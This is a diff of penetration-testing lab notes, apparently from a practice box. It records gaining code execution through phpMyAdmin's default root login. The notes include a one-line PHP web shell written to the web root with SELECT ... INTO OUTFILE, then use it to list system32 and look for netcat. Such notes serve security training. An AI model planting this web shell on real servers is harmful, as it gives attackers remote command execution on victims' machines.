@@ -121,6 +121,18 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221027005654.png)
 
  #### - Googled "phpmyadmin mysql root login exploit" and found the following webpage showing to click the SQL  link. I then typed SELECT "<?php system($_GET['cmd']); ?>"  INTO OUTFILE 'C:/wamp/www/cmd.php' and go
+![](Pasted%20image%2020221027143942.png)
+
+![](Pasted%20image%2020221027144117.png)
+ #RootDefaultPasswordSqlInjectionWebshell
+
+#### -Navigated to "http://192.168.231.189:8080/cmd.php/cmd?=dir C:\Windows\system32" Then typed ctrl+f and nc.exe to confirm if netcat was downloaded on the machine and found it was not:
+
+![](Pasted%20image%2020221027144303.png)
+
+
+
+
 ---
 
 # Lateral Movement to user
